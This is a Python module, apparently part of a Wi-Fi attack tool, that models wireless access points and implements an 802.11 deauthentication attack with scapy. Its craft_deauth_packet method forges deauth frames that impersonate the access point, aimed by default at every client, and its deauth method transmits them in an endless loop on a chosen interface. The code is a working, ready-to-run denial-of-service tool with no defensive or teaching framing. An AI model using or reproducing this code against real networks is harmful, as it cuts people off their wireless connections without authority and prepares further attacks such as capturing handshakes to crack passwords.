from __future__ import annotations

from typing import TYPE_CHECKING

from scapy.packet import Packet

if TYPE_CHECKING:
    # imports that are only used for typechecking
    from objects.interfaces import Interface

from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, sendp

class Network:

    def __init__(self,
        bssid: str,
        ssid: str = 'unknown',
        dbm_signal: str = 'unknown',
        channel: str = 'unknown',
        crypto: str = 'unknown',
    ) -> None:

        self._bssid = bssid
        self._ssid = ssid
        self._dbm_signal = dbm_signal
        self._channel = channel
        self._crypto = crypto

    def get_bssid(self) -> str:
        return self._bssid

    def get_ssid(self) -> str:
        return self._ssid

    def get_dbm_signal(self) -> str:
        return self._dbm_signal

    def get_channel(self) -> str:
        return self._channel

    def get_deauth_packet(self) -> Packet:
        return self._deauth_packet

    def get_crypto(self) -> set:
        return self._crypto
    
    def set_bssid(self, bssid: str) -> None:
        self._bssid = bssid
    
    def set_ssid(self, ssid: str) -> None:
        self._ssid = ssid
    
    def craft_deauth_packet(
        self,
        target_mac: str = 'ff:ff:ff:ff:ff:ff',
    ) -> None:
        bssid = self.get_bssid()

        # 802.11 frame
        dot11 = Dot11(
            addr1 = target_mac, # destination MAC
            addr2 = bssid, # source MAC
            addr3 = bssid, # Access Point MAC
        )
        # stack them up
        self._deauth_packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    
    def deauth(
        self,
        interface: Interface,
        interval: float = .1,
        count: int = 0,
        verbose: bool = True,
    ) -> None:

        # send the packet
        sendp(
            x = self.get_deauth_packet(),
            inter = interval,
            count = count,
            loop = not count,
            iface = interface.get_name(),
            verbose = verbose,
        )
    
    def __str__(self) -> str:
        return str(self.__dict__)